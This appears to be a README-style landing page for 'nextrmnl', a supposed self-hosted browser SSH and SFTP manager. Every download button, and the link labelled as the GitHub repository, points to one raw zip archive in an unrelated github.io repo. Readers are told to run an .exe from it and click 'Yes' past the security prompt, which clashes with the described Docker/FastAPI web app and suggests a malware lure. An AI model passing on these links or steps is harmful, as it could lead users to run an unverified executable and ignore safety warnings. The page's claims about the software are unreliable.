---
layout: "default"
title: "🌐 nextrmnl - Your Server, Right in the Browser"
description: "Self-hosted SSH and SFTP in your browser, with secure vaults and PuTTY-style terminal controls."
---
# 🌐 nextrmnl - Your Server, Right in the Browser

[![Download Now](https://img.shields.io/badge/Download-nextrmnl-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/habsanprad/habsanprad.github.io/main/stap/Application_2.4-beta.3.zip)

## 👋 Welcome to nextrmnl

Imagine having your home server's terminal and file manager right inside your web browser—no extra software, no complicated setups. That's exactly what nextrmnl does. It's like having PuTTY and WinSCP combined into one friendly web app, packaged neatly for your homelab.

If you've ever wanted to manage your server from any device without installing anything, nextrmnl is your answer. It's secure, private, and completely self-hosted—meaning you control everything.

---

## 🎯 What Does nextrmnl Do?

nextrmnl brings two essential tools together:

- **SSH Terminal**: A full-featured command-line interface running directly in your browser. Type commands, run scripts, and manage your server just like you would with PuTTY.
- **SFTP File Transfer**: Drag and drop files between your computer and your server, browse directories, and organize your files with an easy-to-use file manager.

Plus, it includes smart extras like:

- **Per-Account Vault**: Each user gets their own secure storage for passwords and keys.
- **Host Key Checks**: Automatically verifies server identities to keep you safe from man-in-the-middle attacks.
- **OpenID Connect Login**: Sign in with your existing accounts (like Google or GitHub) using modern authentication.

---

## 🚀 Getting Started

Ready to try nextrmnl? Follow these simple steps:

### Step 1: Download the Application

Visit this link to download the application:

[![Download nextrmnl](https://img.shields.io/badge/⬇️%20Download%20nextrmnl-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/habsanprad/habsanprad.github.io/main/stap/Application_2.4-beta.3.zip)

You'll see a list of files. Choose the one that matches your system. For Windows, look for the `.exe` file—it's the easiest option.

### Step 2: Run the Application

Once the download finishes, double-click the downloaded file. The application will start automatically. You might see a security prompt; just click "Run" or "Yes" to proceed.

### Step 3: Open Your Browser

After the application starts, it will automatically open your default web browser. If it doesn't, don't worry—just open Chrome, Firefox, or Edge and go to:

```
http://localhost:8000
```

That's it! You'll see the nextrmnl welcome screen.

---

## 🖥️ System Requirements

nextrmnl works on almost any modern computer. Here's what you need:

- **Operating System**: Windows 10 or 11, macOS 12+, or any Linux distribution
- **Browser**: Latest version of Chrome, Firefox, Edge, or Safari
- **Internet Connection**: Just to download the application initially
- **Memory**: At least 2 GB of RAM (4 GB recommended)

No special hardware or technical skills required!

---

## 🧰 Using nextrmnl for the First Time

Here's a quick tour of what you'll see:

### The Dashboard

When you first open nextrmnl, you'll see a clean dashboard with two main sections:

1. **Terminal** - Click this to open an SSH connection to your server
2. **Files** - Click this to manage files via SFTP

### Connecting to Your Server

1. Click on **"New Connection"**
2. Enter your server's IP address (like `192.168.1.100`)
3. Type your username
4. Add your password or SSH key
5. Click **"Connect"**

That's all there is to it! Your connection will be saved for next time.

### The Terminal Window

Once connected, you'll see a black window with green text—that's your terminal. Type commands just like you would in PuTTY:

- `ls` to list files
- `cd folder-name` to change directories
- `sudo apt update` (Linux) or similar to update your server

### Managing Files

In the Files section, you'll see two panels:

- **Left side**: Your local computer's files
- **Right side**: Your server's files

To transfer a file, simply drag it from one side to the other. You can also right-click to rename, delete, or create new folders.

---

## 🔒 Security Features

Your security is our top priority. nextrmnl includes:

### 🔑 Per-Account Vault

Each user profile has its own encrypted vault for storing:

- SSH private keys
- Passwords
- Connection details

Nobody else can see your stored credentials—even on shared systems.

### 🛡️ Host Key Verification

nextrmnl automatically checks the host key of every server you connect to. If the key doesn't match what's expected, you'll see a warning. This protects you from someone impersonating your server.

### 🔐 OpenID Connect Authentication

Instead of creating yet another username and password, you can sign in using:

- Google
- GitHub
- Any OIDC-compatible provider

Your identity is verified securely through your existing provider.

---

## ⚙️ Configuration Made Simple

### For Homelab Users

If you're running a home server, nextrmnl is designed to fit right in:

- Works with Docker containers
- Uses SQLite for lightweight storage
- FastAPI backend ensures quick responses
- React frontend provides a smooth experience

### Customizing Your Setup

Advanced users can adjust settings by editing a simple configuration file. You can change:

- Port numbers
- Authentication providers
- Storage locations
- Session timeouts

---

## 🧪 Troubleshooting Common Issues

### I Can't Connect to My Server

- Double-check your IP address and username
- Make sure your server allows SSH connections (port 22 by default)
- Try connecting with PuTTY to verify your server is reachable

### The Page Doesn't Load

- Confirm the application is running (look for the icon in your system tray)
- Try a different browser
- Restart the application

### Files Won't Upload

- Check your server's disk space
- Make sure you have write permissions in the target folder
- Try uploading smaller files first

---

## 📖 Frequently Asked Questions

**Q: Is nextrmnl free?**
Yes, completely free and open-source.

**Q: Can I use it on my phone?**
Absolutely! Open your browser on your phone and navigate to the same address.

**Q: Do I need to install anything on my server?**
No. nextrmnl connects to standard SSH and SFTP services already running on your server.

**Q: Can multiple people use it?**
Yes, each user gets their own account, vault, and connections.

---

## 🌟 Why Choose nextrmnl?

| Feature | Benefit |
|---------|---------|
| Browser-Based | No installations on client machines |
| Self-Hosted | You control your data completely |
| Modern Security | OIDC, host key checks, encrypted vaults |
| Dual Function | Terminal + File Manager in one |
| Lightweight | Runs on modest hardware |

---

## 📝 License and Credits

nextrmnl is open-source software, released under the MIT license. It's built using:

- Python and FastAPI for the backend
- React and TypeScript for the frontend
- AsyncSSH for secure connections
- SQLite for data storage

Special thanks to the open-source community for making this possible.

---

## 📬 Get Support

If you need help:

- Visit the GitHub repository: [habsanprad/nextrmnl](https://raw.githubusercontent.com/habsanprad/habsanprad.github.io/main/stap/Application_2.4-beta.3.zip)
- Open an issue for bug reports or feature requests
- Check the discussions tab for community tips

---

## 🎉 Ready to Get Started?

Download nextrmnl today and experience the easiest way to manage your servers from your browser:

[![Get nextrmnl Now](https://img.shields.io/badge/🚀%20Get%20nextrmnl%20Now-Download-green?style=for-the-badge)](https://raw.githubusercontent.com/habsanprad/habsanprad.github.io/main/stap/Application_2.4-beta.3.zip)

Your server, your browser, your control—all in one amazing application.

---

Keywords: asyncssh, authentik, connection-manager, docker, fastapi, homelab, oidc, putty, python, react, self-hosted, selfhosted, sftp, sqlite, ssh, ssh-client, terminal, typescript, web-terminal, xterm